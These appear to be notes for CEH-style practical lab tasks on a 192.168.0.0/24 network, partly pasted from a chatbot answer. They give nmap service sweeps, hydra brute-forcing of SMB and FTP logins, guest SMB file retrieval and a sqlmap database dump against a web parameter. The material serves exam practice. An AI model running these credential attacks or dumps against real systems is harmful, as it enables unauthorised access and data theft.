xploit Investigation: Investigate a compromised Windows web development environment, scan the network, enumerate services, and find the IP address of a server running WampServer.

nmap -p 80,443 --script=http-enum 192.168.0.0/24
how to find answer
(This scans the subnet for HTTP services.
Identify WampServer:
Look for signatures or service banners indicating "WampServer".)

*Identify a Machine with SMB Service Enabled and Crack SMB Credentials*

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.0.0/24
hydra -L userlist.txt -P passlist.txt smb://192.168.0.10
Replace userlist.txt and passlist.txt with the appropriate username and password files.
Access SMB Share to Get the File:

smbclient //192.168.0.10/shared -U Henry
Decrypt the Encoded Secret:

Use the password to decrypt the encoded file (e.g., with openssl or gpg).

#Exploit Weak Credentials for FTP Service on a Windows Machine#
nmap -p 21 192.168.0.0/24 --open -sV
Look for the IP address where the FTP service is running
Replace <target_IP> with the IP address found in the nmap scan.
hydra -L userlist.txt -P passlist.txt ftp://<target_IP>


Scan for FTP Service:

Use nmap to scan the 192.168.0.0/24 subnet to find a machine running FTP (port 21).

-> nmap -p 21 192.168.0.0/24 --open -sV

Look for the IP address where the FTP service is running.

Use hydra to brute-force the FTP credentials. Create a list of potential usernames and passwords or use a commonly available list (e.g., rockyou.txt).

-> hydra -L userlist.txt -P passlist.txt ftp://<target_IP>

-> ftp <target_IP>
->get Credentials.txt
->cat Credentials.txt

get "C:\Users\Admin\Documents\die-another-da"
exiftool die-another-da

gdb die-another-da
The output will display the entry point address. Record this value as your answer.

$Exploiting a Web Application to Find a Flag$
curl -X GET "http://www.cehorg.com?page_id=84"
This command will return the contents of the page with page_id=84. You may modify the page_id parameter to test different values and observe changes in the response.


If the page_id parameter is vulnerable to SQL injection:

sqlmap -u "http://www.cehorg.com?page_id=84" --batch --dump

task 19 A disgruntled ex-employee has hidden a server access code in a Windows machine in the 192.168.0.0/24 subnet. You cannot physically access the target machine, but you know that the organization uses it for administration purposes.

Identify the target machine:

Use nmap to scan the subnet and identify the Windows machine.
Example command:
bash
Copy code
nmap -p 445 --open -sS 192.168.0.0/24
Look for a host with port 445 open (indicating SMB).
Access the machine via SMB:

Once you identify the IP address, connect to the machine using the smbclient tool.
Example command:
bash
Copy code
smbclient -L \\192.168.0.X -U guest
If you find shared directories, connect to the one where the file might be located.
Example:
bash
Copy code
smbclient \\\\192.168.0.X\\share_name -U guest
Search for the sa_code.txt file:

Navigate through the shared directories and search for sa_code.txt.
Example commands:
bash
Copy code
cd path/to/directory
ls
Download and read the file:

Once you locate the sa_code.txt file, download it.
Example command:
bash
Copy code
get sa_code.txt
Open the file to retrieve the server access code.
Example:
bash
Copy code
cat sa_code.txt
Submit the string in the file as the answer.
